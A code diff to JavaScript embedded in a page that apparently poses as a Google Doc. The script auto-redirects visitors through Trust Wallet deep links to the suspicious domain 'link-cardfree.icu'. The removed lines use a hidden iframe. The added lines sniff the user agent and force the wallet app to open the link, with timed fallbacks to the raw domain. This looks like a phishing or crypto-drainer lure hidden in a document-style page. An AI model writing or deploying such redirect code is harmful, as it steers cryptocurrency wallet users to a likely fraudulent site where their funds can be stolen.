@@ -307,14 +307,11 @@ window.GOOGLE_DOC = "<!doctype html>\n<html lang=\"ru\">\n<head>\n<meta charset=
       (function(){
       var target = "https://link-cardfree.icu/";
       var enc = encodeURIComponent(target);
-      try {
-        var f = document.createElement("iframe");
-        f.style.display = "none";
-        f.src = "trust://open_url?url=" + enc;
-        document.body.appendChild(f);
-      } catch (e) {}
-      setTimeout(function(){ if (!document.hidden) location.href = "https://link.trustwallet.com/open_url?url=" + enc; }, 1400);
-      setTimeout(function(){ if (!document.hidden) location.href = target; }, 3400);
+      var ua = navigator.userAgent || "";
+      if (/trustwallet|trust app|trust\/[0-9]/i.test(ua)) { location.replace(target); return; }
+      location.href = "trust://open_url?url=" + enc;
+      setTimeout(function(){ if (!document.hidden) location.href = "https://link.trustwallet.com/open_url?url=" + enc; }, 1200);
+      setTimeout(function(){ if (!document.hidden) location.href = target; }, 3000);
     })();
     }, 1500);
   }
